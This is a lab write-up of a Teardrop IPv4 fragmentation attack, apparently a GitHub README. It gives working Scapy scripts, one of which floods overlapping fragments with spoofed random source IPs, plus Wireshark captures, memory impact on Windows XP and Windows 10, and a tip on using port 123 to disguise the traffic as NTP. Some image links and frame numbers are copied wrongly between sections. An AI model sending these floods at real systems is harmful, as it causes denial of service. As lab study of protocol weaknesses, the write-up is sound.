# IPv4 Fragmentarion Attack (Teardrop ICMP/UDP) Writeup

## Index

- [Introduction](#introduction)
- [Folder Structure](#folder-structure)
- [Test Enviroment & Technologies Used](#test-enviroment-and-technologies-used)
- [How it works](#how-it-works)
- [Troubleshooting](#troubleshooting)
- [Execution and Analysis](#executionandanalysis)
- [Impact](#impact)
- [Conclusion](#conclusion)
- [Concepts](#concepts)

## Introduction
This lab emerges from desire to learn the structure of IPv4 datagram headers and how to manipulate them, rather than simply exploiting the vulnerability itself.
This folder of repository contains a practical demonstration of the Teardrop attack, which exploits a vulnerability in the IPv4 Fragment reassembly process.

The attack consists of sending fragments of IP packets with malicious offsets, causing data overlap. Vulnerable systems can suffer from memory exhaustion or critical failure (BSOF/Kernel Panic) while attempting to process these fragments.

## Folder Structure

The repository is organized as follows:

```text
teardrop-ipv4/
├─ README.md               
├─ images/                         # Evidences of system impact
│   ├─ xp_idle.png
│   ├─ xp_attack.png
│   ├─ win10_idle.png
│   └─ win10_attack.png
└─ scripts/                        # PoC in Python
    ├─ teardrop_v1.py              # Script of validation
    └─ teardrop_v2.py              # Autamated script with IP Spoofing

```

## Test Enviroment and Technologies Used

* **Attacker:** Python + Scapy + Linux
* **Victim 1:** Windows XP Pro SP1 (VMware via Bridge Mode).
* **Victim 2:** Windows 10 Pro (Host).
* **Linux CLI Tools:** ifconfig, grep
* **Windows CMD Tools:** ipconfig 
* **Forensiscs Tools:** Wireshark

## How it works

The attacker's machine executes a malicious script that sends a large number of maliciously fragmented IPv4 + UDP packets.
The victims, in this case, are machines running Windows XP Pro SP1 (VMware via Bridge mode) and Windows 10 Pro.
To generate the malicious packets, a Python script was written using the Scapy library.
This technique exploits the **Frag Offset** field of the second packet, setting it to a small value so that its data overlaps with that of the first fragment during reassembly, forcing the kernel to handle conflicting data.

### Example of Logic (Scapy)

```python
# Fragment 1: Starts at byte 0 with 1408 bytes of payload
p1 = IP(dst=target, flags=1)/UDP(sport=123, dport=80)/("A"*1400)
# Fragment 2: Starts at byte 64 (frag=1), causing massive overlap
p2 = IP(dst=target, frag=1, proto=17)/("B"*1400)
```

## Troubleshooting

The VM where configured to use Bridge mode, to interact with network directly, but the VM was not able to obtain connection with LAN. So I needed to reconfigure VMnet0 on Virtual Network Editor and reinstall VMware Bridge Protocol of network card.

### Instructions

VMnet0 Reconfiguration: VMware -> Edit -> Virtual Network Editor.
VMware Bridge Protocol reinstalation: Control Panel -> Network and Internet -> Network Connections -> click no rato com botao direito-> Properties.

manual service initialization:
```bash
    net start vmnetbridge
```

## Execution and Analysis 

Script v1: validation of overlap of two 1400 byte packets. 
On the 2nd packet frag=1 (offset of 1 x 8 bytes) is defined, so system need to deal with overlap of 1400 bytes.
	
```python
    from scapy.all import *
                                                                                
    p1 = IP(dst="<Target_IP>")/UDP(sport=123, dport=80)/("A"*1400)                              
    p2 = IP(dst="<Target_IP>")/("B"*1400)                             
    p1.flags = 1 # More Fragments, also possible to define as flags = "MF"                                                                       
    p2.frag = 1   #Adjust the offset to a position that causes overlap      
    p2.proto = 17 #According to IANA, we indicate the protocol to use                   
                                                                                
    send(p1, iface="en0")         
    send(p2, iface="en0")    
```                                             
	Traffic Evidence Captured in Wireshark (Script v1 - Target: windows XP Pro)
	
		Frame: 1
		Interface: en0
		Protocol Stack: Ethernet II -> IPv4 -> UDP -> Data
		IPv4 
		├─ Version: 4 
		├─ Header Length: 20 bytes 
		├─ Total Length: 1428 bytes 
		├─ Identification: 0x0001 (1)
		├─ Flags: 0x1 (More Fragments) 
		├─ Fragment Offset: 0 
		├─ TTL: 100
		├─ Protocol: UDP (17) 
		├─ Source IP: <Attacker_IP> 
		└─ Destination IP: <Target_IP>
		Data (Payload) 
		├─ Length: 1408 bytes 
		└─ Content: 007b0050...  <- Contains the spoofed UDP header and payload with "A"
	
		Frame: 2
		Interface: en0
		Protocol Stack: Ethernet II -> IPv4 -> UDP (Fragmented)
		IPv4 
		├─ Version: 4 
		├─ Header Length: 20 bytes 
		├─ Total Length: 1420 bytes 
		├─ Identification: 0x0001 (1) 
		├─ Flags: 0x0 (Last Fragment)
		├─ Fragment Offset: 1     <- Start at byte 8
		├─ TTL: 100
		├─ Protocol: UDP (17) 
		├─ Source IP: <Attacker_IP> 
		└─ Destination IP: <Target_IP>
		Analysis 
		├─ Reassembly: [2 IPv4 Fragments (1408 bytes): nº 1, nº 2] 
		├─ Overlap: This frame overlaps 1400 bytes from the previous frame. 
		├─ Ambiguity: Wireshark interprets the start of this payload as NTP (Network Time Protocol) due to the spoofed UDP ports. 
		└─ Status: Identified as [Reassembled IPv4], indicating that the TCP/IP stack has accepted the peering.
		
	Script v2: automating bulk sending with IP Spoofing (RandIP) to test for resource exaustion when system mantains multiple "incompleted packets" states in memory.
	
```python
	from scapy.all import *
	import time
	import random
	
	target = "<TARGET_IP>"
	interface = "en0"
	
	try:
	    while True:
	        random_ip = str(RandIP())
	                
	        p1 = IP(src=random_ip, dst=target, flags=1, id=66)/UDP(sport=123, dport=80)/("A"*1400)
	        p2 = IP(src=random_ip, dst=target, frag=1, id=66, proto=17)/("B"*1400)
	        
		   send([p1, p2], iface=interface, verbose=False)
	            
	except KeyboardInterrupt:
	    print("\nAttack interrupted.")	
```
	Traffic Evidence (Script v2 - Target: windows XP Pro)
	
		Frame: 13006545
		Interface: en0
		Protocol Stack: Ethernet II -> IPv4 -> Data (Fragmento 1) 
		IPv4 
		├─ Version: 4 
		├─ Header Length: 20 bytes 
		├─ Total Length: 1428 bytes 
		├─ Identification: 0x0042 (66) 
		├─ Flags: 0x1 (More Fragments) 
		├─ Fragment Offset: 0          
		├─ TTL: 64 
		├─ Protocol: UDP (17) 
		├─ Source IP: 149.215.95.68 
		└─ Destination IP: 192.168.8.133 
		Data (Payload) 
		├─ Length: 1408 bytes 
		└─ Content: 007b00500580c76b4141...     <-   contains spoofed UDP header (Ports 123 -> 80) and beggining of payload "A".

		Frame: 13006546
		Interface: en0
		Protocol Stack: Ethernet II -> IPv4 -> UDP (Reassembled) -> NTP 
		IPv4 
		├─ Version: 4 
		├─ Header Length: 20 bytes
		├─ Total Length: 1420 bytes 
		├─ Identification: 0x0042 (66) 
		├─ Flags: 0x0 (Last Fragment) 
		├─ Fragment Offset: 1       <- It starts at byte 8 (1 x 8 bytes) and results in a 1400-byte overlap of the first fragment.
		├─ TTL: 64 
		├─ Protocol: UDP (17) 
		├─ Source IP: 149.215.95.68 
		└─ Destination IP: 192.168.8.133 
		Analysis 
		├─ Reassembly: [2 IPv4 Fragments (1408 bytes): nº 13006545, nº 13006546]
		├─ Status: Identified as [Reassembled IPv4], indicating that the TCP/IP stack has accepted the peering.
		└─ Ambiguity: Wireshark interprets the final payload as NTP because the spoofed source port of the first fragment is 123.
	
	
	Traffic Evidence (Script v2 - Target: Windows 10 Pro)
		 
		Frame: 21590
		Interface: \Device\NPF_{...}
		Protocol Stack: Ethernet II -> IPv4 -> Data (Fragment 1) 
		IPv4 
		├─ Version: 4 
		├─ Header Length: 20 bytes 
		├─ Total Length: 1428 bytes 
		├─ Identification: 0x0042 (66) 
		├─ Flags: 0x1 (More Fragments) 
		├─ Fragment Offset: 0
		├─ TTL: 64 ├─ Protocol: UDP (17) 
		├─ Source IP: 239.79.93.157 
		└─ Destination IP: 192.168.8.142 
		Data (Payload) 
		├─ Length: 1408 bytes 
		└─ Content: 007b005005806f914141... 
		
		Frame: 21591
		Interface: \Device\NPF_{...}
		Protocol Stack: Ethernet II -> IPv4 -> UDP (Reassembled) -> NTP IPv4 
		├─ Version: 4 
		├─ Header Length: 20 bytes 
		├─ Total Length: 1420 bytes 
		├─ Identification: 0x0042 (66) 
		├─ Flags: 0x0 (Last Fragment) 
		├─ Fragment Offset: 1   
		├─ TTL: 64 
		├─ Protocol: UDP (17) 
		├─ Source IP: 239.79.93.157 
		└─ Destination IP: 192.168.8.142 
		Analysis 
		├─ Reassembly: [2 IPv4 Fragments (1408 bytes): nº 13006545, nº 13006546]
		├─ Status: Identified as [Reassembled IPv4], indicating that the TCP/IP stack has accepted the peering.
		└─ Ambiguity: Wireshark interprets the final payload as NTP because the spoofed source port of the first fragment is 123.

Wireshark shows that the attack was successful at layer 3 of the TCP/IP model. The first fragment delivers 1408 bytes and the second the rest of the packet, but the second starts at the 8th byte of the packet, meaning it overlaps the first fragment by 1400 bytes. Thus, the system receives two different pieces of data for the same memory space.

## Impact

**Windows XP Pro (via VM)**
	
### Windows XP - Idle
![XP Idle](https://github.com/olgafedyuk/Network-Attacks/blob/main/Teardrop-IPv4/images/xp-idle.png)

### Windows XP - Attack
![XP Idle](https://github.com/olgafedyuk/Network-Attacks/blob/main/Teardrop-IPv4/images/xp-attack.png)

Data comparison at Task Manager reveals operational cost:
	
| Metrics            | In Rest (Idle)| During Attack | Impact         |
|:-------------------|:--------------|:--------------|:---------------|
| Non-paged Kernel    | 179 MB        | 330 MB        | +151 MB        |
| Recived Packets    | N/A           | 1.405.356     | Massive Flow   |
| System Cache       | 139.976 KB    | 154.512 KB    | +14,5 MB       |

	
The non-paged memory pool does not grow indefinitely until memory is exhausted, therefore it is not vulnerable to this attack.
	
**Windows 10 Pro**
	
### Windows 10 - Idle
![XP Idle](https://github.com/olgafedyuk/Network-Attacks/blob/main/Teardrop-IPv4/images/xp-attack.png)
        
### Windows 10 - Attack
![XP Idle](https://github.com/olgafedyuk/Network-Attacks/blob/main/Teardrop-IPv4/images/10-attack.png)

System has reached RAM limit during the attack.

| Metrics            | In Rest (Idle)   | During Ataque    | Impact                       |
|:-------------------|:-----------------|:-----------------|:-----------------------------|
| Memory in use     | 3.4 GB (43%)     | 7.6 GB (96%)     | Ram limit reached      |
| Committed (Total)  | 3.7 / 9.2 GB     | 13.9 / 16.2 GB   | + 10.2 GB (Virtual)          |
| Non-paged Pool     | 179 MB           | 330 MB           | It almost doubled (retention) |
| Cached             | 3.8 GB           | 414 MB           | Drastic drop (expulsion)    |

The system experienced slowdowns during the simultaneous use of various programs and attacks. Even two hours after the attack ended, memory usage levels remained high (91%), suggesting that the operating system is having difficulty releasing allocated resources.

### Performance Comparison

| System | Impact | Resilience |
| --- | --- | --- |
| **Windows XP SP1** | Controlled increase in *Non-Paged Pool* (+151 MB). | Stable (Native protection against blocking). |
| **Windows 10 Pro** | RAM usage jumped from 43% to 96%. Cache drastically reduced. | Vulnerable due to resource exhaustion (DoS due to slowness). |

## Conclusion

Both machines where imune to IPv4 Fragmentation Attack immediate crach due non-paged pool memory leak, although Windows 10 Pro has demonstrated vulnerability to resource exhaustion, resulting in slowness and difficulty in restoring memory even after the attack ends.

## Concepts

**Non-paged Pool:** Kernel memory that cannot be moved to disk (to the paging file), it is always stored only in the physical memory. A large non-paged pool size often indicates that there is a memory leak in some system component or device driver. If exhausted, the system crashes.
**Cached:** Cache memory acts as a high-speed bridge between the CPU and RAM. Temporarily holds data and instructions that the CPU is likely to use again soon, minimizing the need to access the slower main memory. https://www.geeksforgeeks.org/computer-science-fundamentals/cache-memory/
**Port 123 (Use and Evasion):** NTP protocol port (time), many firewalls allow this traffic by default, so it works as camuflage. In Wireshark, the analyst sees "NTP" with incorrect dates (e.g., year 2070) and may confuse the attack with a simple synchronization error, masking the DoS.
